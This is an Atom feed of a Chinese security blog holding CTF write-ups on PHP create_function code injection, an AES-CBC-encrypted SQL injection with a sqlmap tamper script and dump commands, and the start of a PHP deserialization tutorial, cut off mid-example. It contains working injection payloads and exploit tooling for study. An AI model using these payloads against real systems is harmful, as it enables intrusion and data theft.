<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C1imber</title>
  
  <subtitle>原创文章，未经授权请勿转载</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://lawlietweb.com/"/>
  <updated>2018-12-19T11:36:47.865Z</updated>
  <id>http://lawlietweb.com/</id>
  
  <author>
    <name>C1imber</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Code-Breaking Puzzles挑战</title>
    <link href="http://lawlietweb.com/2018/11/30/Code-Breaking%20Puzzles%E6%8C%91%E6%88%98/"/>
    <id>http://lawlietweb.com/2018/11/30/Code-Breaking Puzzles挑战/</id>
    <published>2018-11-30T11:00:05.000Z</published>
    <updated>2018-12-19T11:36:47.865Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Code-Breaking-Puzzles挑战"><a href="#Code-Breaking-Puzzles挑战" class="headerlink" title="Code-Breaking Puzzles挑战"></a>Code-Breaking Puzzles挑战</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>前段时间由于出差参加攻防演练，没有时间去做P牛师傅小密圈二周年的Code-Breaking Puzzles，还好回来以后题目还在，赶紧做了做，题目质量很高，通过这次又学到了很多知识，感谢师傅用心出的题目</strong></p><h3 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h3><p><strong>题目代码如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</div><div class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</div><div class="line">    show_source(<span class="keyword">__FILE__</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $action(<span class="string">''</span>, $arg);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p><strong>题目环境为PHP/7.2.12加上Apache/2.4.25 (Debian)</strong></p><p><strong>首先通过<code>$action(&#39;&#39;, $arg);</code>可以想到PHP的动态代码执行，通过这里面的参数可以看出这里应该使用<code>create_function</code>这个函数去进行代码执行，关于这个函数的执行流程如下：</strong></p><pre><code>1.获取参数, 函数体;2.拼凑一个”function __lambda_func (参数) { 函数体;} “的字符串;3.eval;4.通过__lambda_func在函数表中找到eval后得到的函数体, 找不到就出错;5.定义一个函数名:”\000_lambda_” . count(anonymous_functions)++;6.用新的函数名替换__lambda_func;7.返回新的函数。</code></pre><p><strong>以上流程可以简单理解为在使用该函数时会生成一个匿名函数，该函数的第一个参数会作为匿名函数的参数传入，该函数的第二个参数为匿名函数要执行的代码段，看下面的代码实例：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $func=create_function(<span class="string">'$a,$b'</span>,<span class="string">'echo $a+$b;'</span>);</div><div class="line">    $func(<span class="number">1</span>,<span class="number">2</span>);</div><div class="line">    <span class="comment">//3</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>这段代码的执行过程等价于</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">anonymous_func</span><span class="params">($a,b)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">        <span class="keyword">echo</span> $a+$b;</div><div class="line">&#125;</div><div class="line">    anonymous_func(<span class="number">1</span>,<span class="number">2</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><strong>于是有了一个思路，这里可以传入<code>action=create_function&amp;arg=}phpinfo();/*</code>去执行phpinfo,这样构造的原因是因为这里通过<code>create_function</code>生成的匿名函数并没有赋值给任何变量，所以无法调用该匿名函数，但是由于此处的环境是php的<code>eval</code>环境，所以可以通过<code>}</code>去闭合该匿名函数，之后就执行任意代码了，而这里的<code>/*</code>用来注释后面多出的代码，这里执行的代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">create_function(<span class="string">''</span>,<span class="string">'&#125;phpinfo();/*'</span>);</div></pre></td></tr></table></figure><p><strong>实际执行过程变为了如下代码</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">anonymous_func</span><span class="params">()</span></span>&#123;&#125;phpinfo();\*&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p><strong>于是便可以成功执行phpinfo,但是这道题里只是这样构造是不可以的，这里还需要绕过对传入的<code>$action</code>的正则检查，通过正则可以看出<code>$action</code>的内容不能只包含数字字母和<code>_</code>，在这里面卡了好久，于是看了P牛的讲解，这里可以通过在函数名前加上<code>\</code>去绕过，构造<code>action=\create_function&amp;arg=}phpinfo();/*</code>就可以成功执行phpinfo</strong></p><p><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181130/oNzIUYcJHOL4.png" alt="mark"></p><p><strong>至于函数前面为什么可以加<code>\</code>,P牛也给出了详细的解释，这里用到了php当中的命名空间，在php当中有一个默认的命名空间为<code>\</code>，PHP当中的所有原生函数和类都在这个命名空间下，平常我们在使用函数的时候直接写函数名去调用函数实际上用的是相对路径，而在函数名前面加上<code>\</code>用的是绝对路径去调用函数</strong></p><p><strong>接下来尝试使用命令执行函数执行命令，但是发现命令执行函数都被禁用掉了</strong><br><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181130/i3Ar2ajDTduJ.png" alt="mark"></p><p><strong>只能通过执行代码的方式寻找flag文件了</strong></p><p><strong>寻找flag文件的位置</strong></p><pre><code>action=\create_function&amp;arg=}print_r(scandir(&quot;/var/www/&quot;));/*</code></pre><p><strong>找到flag文件的位置在<code>/var/www</code>目录下</strong></p><p><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181130/lv67vOhsSTJO.png" alt="mark"></p><p><strong>读取flag</strong></p><pre><code>action=\create_function&amp;arg=}echo file_get_contents(&quot;/var/www/flag_h0w2execute_arb1trary_c0de&quot;);/*</code></pre><p><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181130/LHgNeuJvbjkm.png" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Code-Breaking-Puzzles挑战&quot;&gt;&lt;a href=&quot;#Code-Breaking-Puzzles挑战&quot; class=&quot;headerlink&quot; title=&quot;Code-Breaking Puzzles挑战&quot;&gt;&lt;/a&gt;Code-Breaking Puz
      
    
    </summary>
    
      <category term="ctf" scheme="http://lawlietweb.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://lawlietweb.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018湖湘杯注入题writeup</title>
    <link href="http://lawlietweb.com/2018/11/19/2018%E6%B9%96%E6%B9%98%E6%9D%AF/"/>
    <id>http://lawlietweb.com/2018/11/19/2018湖湘杯/</id>
    <published>2018-11-19T11:30:56.000Z</published>
    <updated>2018-12-19T11:36:13.245Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2018湖湘杯注入题writeup"><a href="#2018湖湘杯注入题writeup" class="headerlink" title="2018湖湘杯注入题writeup"></a>2018湖湘杯注入题writeup</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>这段时间事情很多，导致这次比赛没有报上名，周日总算闲了下来，看到师傅在群里发了几个题目的链接，于是滑了一波水，在这里记录一下</strong></p><h3 id="WEB-Code-Check"><a href="#WEB-Code-Check" class="headerlink" title="WEB Code Check"></a>WEB Code Check</h3><p><strong>其实昨天写这道题的时候并不知道这个题的题目是什么（有点尴尬），打开题目发现是一个登陆框，进行正常的登陆流程时会出现如下的错误，所以猜测该登陆功能可能不能正常使用</strong><br><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181119/4OOqnC1qMaXC.png" alt="mark"><br><strong>看到登陆处显示平台正在停机维护，不能正常使用应该和这个有一些关系吧</strong><br><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181119/pIrsEaltyAY1.png" alt="mark"><br><strong>接下来查看页面源代码，尝试发现问题，看到有一处连接</strong></p><pre><code>http://39.108.176.234:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09</code></pre><p><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181119/6bNnKTXanQT5.png" alt="mark"><br><strong>打开后是一个显示信息的页面</strong><br><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181119/kPv8QXKJFJmq.png" alt="mark"><br><strong>id参数可能是存在注入的，id的值看起来像是一串base64，于是猜测可能是base64编码后的sql注入，但是在尝试base64解码的时候，第二次解码的时候就不能解码了，会出现乱码</strong></p><p><strong>接下来，偶然发现了一处目录遍历，此处泄露了list.php的源码</strong><br><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181119/vBzDRTmHetEN.png" alt="mark"></p><p><strong>list.php源码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</div><div class="line"><span class="keyword">require_once</span> <span class="string">'../config.php'</span>;</div><div class="line"><span class="comment">//解密过程</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span></span>&#123;</div><div class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</div><div class="line">mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</div><div class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</div><div class="line">mcrypt_generic_deinit($td);</div><div class="line">mcrypt_module_close($td);</div><div class="line"><span class="keyword">if</span>(substr(trim($data),<span class="number">-7</span>)!==<span class="string">'hxb2018'</span>)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;script&gt;window.location.href="/index.php";&lt;/script&gt;'</span>;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">return</span> substr(trim($data),<span class="number">0</span>,strlen(trim($data))<span class="number">-7</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">$id=decode($_GET[<span class="string">'id'</span>]);</div><div class="line">$sql=<span class="string">"select id,title,content,time from notice where id=$id"</span>;</div><div class="line">$info=$link-&gt;query($sql);</div><div class="line">$arr=$info-&gt;fetch_assoc();</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=<span class="string">"en"</span>&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta charset=<span class="string">"UTF-8"</span>&gt;</div><div class="line">&lt;title&gt;X公司HR系统V1<span class="number">.0</span>&lt;/title&gt;</div><div class="line">&lt;style&gt;.body&#123;width:<span class="number">600</span>px;height:<span class="number">500</span>px;margin:<span class="number">0</span> auto&#125;.title&#123;color:red;height:<span class="number">60</span>px;line-height:<span class="number">60</span>px;font-size:<span class="number">30</span>px;font-weight:<span class="number">700</span>;margin-top:<span class="number">75</span>pt;border-bottom:<span class="number">2</span>px solid red;text-align:center&#125;.content,.title&#123;margin:<span class="number">0</span> auto;width:<span class="number">600</span>px;display:block&#125;.content&#123;height:<span class="number">30</span>px;line-height:<span class="number">30</span>px;font-size:<span class="number">18</span>px;margin-top:<span class="number">40</span>px;text-align:left;color:<span class="comment">#828282&#125;&lt;/style&gt;</span></div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;div class="body"&gt;</div><div class="line">&lt;div class="title"&gt;&lt;?php echo $arr['title']?&gt;&lt;/div&gt;</div><div class="line">&lt;div class="content"&gt;&lt;?php echo $arr['content']?&gt;&lt;/div&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure><p><strong>可以看到此处的id参数进行了AES加密处理，加密模式为CBC模式，之后服务端会对id参数进行解密，之后将解密的结果拼接进sql语句，从而产生了sql注入，源码中泄露了AES加密解密的key(密钥)和iv(初始化向量)，有了key和iv这两部分，就可以随意的构造sql注入的payload了</strong></p><p><strong>解密代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $data=<span class="string">"b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09"</span>;</div><div class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</div><div class="line">mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</div><div class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</div><div class="line">mcrypt_generic_deinit($td);</div><div class="line">mcrypt_module_close($td);</div><div class="line"><span class="keyword">echo</span> substr(trim($data),<span class="number">0</span>,strlen(trim($data))<span class="number">-7</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181119/uGcgDrNkBPfE.png" alt="mark"></p><p><strong>根据解密的代码，结合泄露的key和iv，很容易的编写出生成payload的加密代码，构造延时注入的POC，代码如下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$payload=<span class="string">"1 and sleep(5)-- hxb2018"</span>;</div><div class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">''</span>,MCRYPT_MODE_CBC,<span class="string">''</span>);</div><div class="line">mcrypt_generic_init($td,<span class="string">'ydhaqPQnexoaDuW3'</span>,<span class="string">'2018201920202021'</span>);</div><div class="line">$data = base64_encode(base64_encode(mcrypt_generic($td,$payload)));</div><div class="line">mcrypt_generic_deinit($td);</div><div class="line">mcrypt_module_close($td);</div><div class="line"><span class="keyword">echo</span> $data;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181119/L3YFbRXIz7mV.png" alt="mark"></p><p><strong>将经过处理的POC传入到id参数请求</strong></p><pre><code>http://39.108.176.234:49882/news/list.php?id=dTFmeVF0RmtWN2ZYSVBiMWpxNCt1d2p3YWJzVlN4WE1xU0tEbmQ2RHlEMD0=</code></pre><p><strong>发现页面响应延时了5s，说明sql语句执行了，确实是存在注入的</strong><br><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181119/FeHLwaKWIQcn.png" alt="mark"></p><p><strong>为了方便，用python编写sqlmap的tamper脚本对id参数进行相应的处理，实现自动化注入，代码如下:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#编写sqlmap tamper脚本aes_cbc.py</span></div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="string">"""</span></div><div class="line"><span class="string">Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)</span></div><div class="line"><span class="string">See the file 'doc/COPYING' for copying permission</span></div><div class="line"><span class="string">"""</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="keyword">from</span> lib.core.data <span class="keyword">import</span> kb</div><div class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</div><div class="line"></div><div class="line">__priority__ = PRIORITY.NORMAL</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></div><div class="line">    <span class="string">"""</span></div><div class="line"><span class="string">    hxb2018:AES CBC encrypt sql injection</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">    &gt;&gt;&gt; tamper('1 and sleep(5)-- ')</span></div><div class="line"><span class="string">    dTFmeVF0RmtWN2ZYSVBiMWpxNCt1d2p3YWJzVlN4WE1xU0tEbmQ2RHlEMD0=</span></div><div class="line"><span class="string">    """</span></div><div class="line">    <span class="keyword">return</span> encrypt(payload)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(payload)</span>:</span></div><div class="line">    payload=payload+<span class="string">"hxb2018"</span></div><div class="line">    key=<span class="string">"ydhaqPQnexoaDuW3"</span></div><div class="line">    iv=<span class="string">"2018201920202021"</span></div><div class="line">    cipher = AES.new(key,AES.MODE_CBC,iv)</div><div class="line">    <span class="keyword">if</span>(len(payload)%<span class="number">16</span>!=<span class="number">0</span>):</div><div class="line">        payload=payload+(<span class="string">'\0'</span>*(<span class="number">16</span>-len(payload)%<span class="number">16</span>))</div><div class="line">        <span class="keyword">return</span> base64.b64encode(base64.b64encode(cipher.encrypt(payload)))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> base64.b64encode(base64.b64encode(cipher.encrypt(payload)))</div></pre></td></tr></table></figure><p><strong>sqlmap判断存在注入</strong><br>    sqlmap -u “<a href="http://39.108.176.234:49882/news/list.php?id=1" target="_blank" rel="external">http://39.108.176.234:49882/news/list.php?id=1</a>“ –tamper “aes_cbc.py”</p><p><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181119/UekYVNUV0sqg.png" alt="mark"></p><p><strong>获取flag</strong></p><pre><code>sqlmap -u &quot;http://39.108.176.234:49882/news/list.php?id=1&quot; --tamper &quot;aes_cbc.py&quot; --dump -T &quot;notice2&quot; -D &quot;mozhe_discuz_stormgroup&quot;</code></pre><p><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181119/J0LVhOx3QhPD.png" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2018湖湘杯注入题writeup&quot;&gt;&lt;a href=&quot;#2018湖湘杯注入题writeup&quot; class=&quot;headerlink&quot; title=&quot;2018湖湘杯注入题writeup&quot;&gt;&lt;/a&gt;2018湖湘杯注入题writeup&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="ctf" scheme="http://lawlietweb.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://lawlietweb.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>深入学习PHP反序列化漏洞-绕过_wakeup()函数</title>
    <link href="http://lawlietweb.com/2018/10/26/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-%E7%BB%95%E8%BF%87_wakeup()%E5%87%BD%E6%95%B0/"/>
    <id>http://lawlietweb.com/2018/10/26/深入学习PHP反序列化漏洞-绕过_wakeup()函数/</id>
    <published>2018-10-26T09:35:30.000Z</published>
    <updated>2018-12-19T11:35:42.849Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入学习PHP反序列化漏洞-绕过-wakeup-函数"><a href="#深入学习PHP反序列化漏洞-绕过-wakeup-函数" class="headerlink" title="深入学习PHP反序列化漏洞-绕过_wakeup()函数"></a>深入学习PHP反序列化漏洞-绕过_wakeup()函数</h1><h3 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h3><p><strong>代码如下，要求利用php反序列化漏洞去读取<code>flag.php</code>文件中的内容</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </div><div class="line">    <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </div><div class="line">      <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</div><div class="line">       <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</div><div class="line">          show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</div><div class="line">       <span class="keyword">else</span>      <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</div><div class="line">      &#125;&#125;  </div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>; &#125; </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="string">''</span> ;&#125;&#125;     </div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123; show_source(<span class="string">'index.php'</span>); &#125; </div><div class="line">    <span class="keyword">else</span>&#123; </div><div class="line">       $file=base64_decode( $_GET[<span class="string">'file'</span>]); </div><div class="line">       <span class="keyword">echo</span> unserialize($file ); &#125; </div><div class="line"><span class="meta">?&gt;</span>   <span class="comment">#&lt;!--key in flag.php--&gt;</span></div></pre></td></tr></table></figure><a id="more"></a><h3 id="php反序列化简单介绍"><a href="#php反序列化简单介绍" class="headerlink" title="php反序列化简单介绍"></a>php反序列化简单介绍</h3><p><strong>根据php官方文档的介绍，php反序列化用于在开发中存储或传递php的值，同时又不丢失其类型和结构，php当中和反序列化有关的两个重要函数，分别为<code>serialize</code>和<code>unserialize</code>，这两个函数可以处理除<code>resource</code>(资源类型)之外的任何php数据类型，对php值进行序列化和反序列化操作</strong></p><h3 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h3><p><strong>php反序列化本身其实是没有危害的，但是当对一个php对象进行序列化或者反序列化操作时，由于对象里面的一些魔术方法会在一些情况下被触发，刚好这些魔术方法里面调用了一些危害的函数并且函数的参数是我们可以控制的，就会产生预料之外的危害，有关php对象的一些常见魔术方法如下：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">__construct<span class="comment">//在对象创建时触发</span></div><div class="line">__destruct<span class="comment">//在对象销毁时触发</span></div><div class="line">__sleep<span class="comment">//在对象序列化之前触发</span></div><div class="line">__wakeup<span class="comment">//在反序列化还原对象之前触发</span></div><div class="line">__toString<span class="comment">//但对象被当作字符串时触发</span></div><div class="line">__get<span class="comment">//访问不可访问的属性时触发</span></div><div class="line">...</div></pre></td></tr></table></figure><p><strong>具体看下面的例子</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</div><div class="line">  <span class="keyword">private</span> $a=<span class="string">"private"</span>;</div><div class="line">  <span class="keyword">protected</span> $b=<span class="string">"protected"</span>;</div><div class="line">  <span class="keyword">public</span> $c=<span class="string">"public"</span>;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"__construct&lt;/br&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"__destruct&lt;/br&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="string">"__toString&lt;/br&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"__sleep&lt;/br&gt;"</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"__wakeup&lt;/br&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($a)</span></span></div><div class="line"><span class="function">  </span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"__get&lt;/br&gt;"</span>;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;a;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">$class=<span class="keyword">new</span> test();<span class="comment">//触发__construct,输出__construct</span></div><div class="line"><span class="keyword">echo</span> $class;<span class="comment">//触发__toString,输出__toString</span></div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line"><span class="keyword">echo</span> $class-&gt;a;<span class="comment">//访问私有属性$a,触发__get,输出__get</span></div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">$str=serialize($class);<span class="comment">//触发__sleep,输出__sleep</span></div><div class="line"><span class="keyword">echo</span> $str;</div><div class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">$new_class=unserialize($str);<span class="comment">//触发__wakeup,输出__wakeup</span></div><div class="line"><span class="comment">//程序结束对象被销毁,触发//destruct,输出__destruct,输出两次，分别销毁$class和$new_class两个对象</span></div><div class="line"><span 